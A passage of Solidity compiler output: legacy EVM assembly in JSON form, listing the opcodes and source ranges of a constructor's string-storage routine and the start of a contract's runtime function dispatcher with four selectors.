									"end": 726,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 700,
									"end": 726,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "22"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DIV",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "KECCAK256",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DIV",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "24"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "FF"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP6",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "23"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "24"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP6",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "23"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "25"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "GT",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "26"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "25"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "26"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "23"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "27"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "28"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "27"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMP",
									"source": 0,
									"value": "[out]"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "28"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "29"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "30"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "GT",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "31"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "30"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "31"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "29"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMP",
									"source": 0,
									"value": "[out]"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "tag",
									"source": 0,
									"value": "22"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220c5967cd6e269ed28bae2282a8ba18efad2d4ad27df048e6b552eb8191a513ab364736f6c63430006060033",
									".code": [
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "6C02A931"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "7B61C320"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "BE9A6555"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH",
											"source": 0,
											"value": "D4E93292"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 428,
											"end": 18313,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 466,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "9"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "9"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "12"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "14"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "12"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "14"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 466,
											"end": 489,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 489,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 496,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 496,
											"end": 521,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "16"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "16"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 496,
											"end": 521,
